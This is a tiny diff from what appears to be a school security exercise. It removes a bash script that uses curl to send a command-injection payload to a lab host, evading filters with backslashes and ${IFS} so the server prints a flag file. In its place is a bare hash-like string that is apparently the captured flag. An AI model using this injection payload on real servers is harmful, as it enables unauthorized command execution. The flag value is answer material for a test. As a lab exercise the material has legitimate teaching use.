@@ -1,2 +1,1 @@
-#!/bin/bash
-curl -s "http://web0x09.hbtn-task1/?ip=$1;ca\t\${IFS}/etc/1-f\lag.txt"
+a240bee1050f6303727382c319d2f0fd 
